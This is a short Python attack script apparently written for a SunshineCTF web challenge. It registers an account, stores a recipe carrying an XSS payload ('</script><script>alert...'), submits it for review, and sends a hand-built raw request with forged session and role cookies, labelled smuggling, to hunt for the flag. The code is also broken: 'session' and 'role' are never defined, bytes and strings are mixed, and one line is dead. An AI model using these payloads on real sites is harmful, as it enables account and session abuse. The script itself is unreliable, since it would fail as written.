#!/usr/bin/env python3
import sys,time,socket,ssl,json,selectors,re;sys.path.insert(0,'.')
from cc import Client
BASE="https://tomorrow.web.2026.sunshinectf.games"
def w(*a):sys.stdout.buffer.write((" ".join(str(x) for x in a)+"\n").encode("utf-8","replace"));sys.stdout.flush()
w("=== setup ===")
c=Client();code,out,_=c.post("/register",{"username":"qs%04d"%(time.time()%10000),"password":"Passw0rd!"});u=c.user
code,out,_=c.post("/api/recipe",{"title":"s","ingredients":[{"name":"xss","value":"</script><script>alert('got')</script>"}]})
rid=out["id"];c.post("/api/recipe/%s/submit"%rid,{});time.sleep(7);c.post("/login",{"username":u,"password":"Passw0rd!"});c.get("/dashboard");session,c.jar["role"]
base_page=open(BASE+"/recipe/"+rid,encoding="utf-8",errors="replace").read() if False else ""
w("Baseline:",len(base_page))
ctx=ssl.create_default_context()
s=ctx.wrap_socket(socket.create_connection((BASE.split("//")[1],443),timeout=25),server_hostname=BASE.split("//")[1])
req=b"GET /review/"+rid+b"\r\nHost: "+BASE.split("//")[1]+b"\r\nCookie: session="+session+"; role="+role+"\r\n\r\n"
s.sendall(req);resp=s.recv(8192)[:10000];s.close()
w("Smuggling #1 got alert?",b"<script>alert('got')</script>" in resp,len(resp))
if re.search(r'class="seal gold"|class="flag"',resp.decode(errors="replace")):w("FOUND GOLDEN BLOCK IN RESPONSE");sys.exit(0)
w("Done")
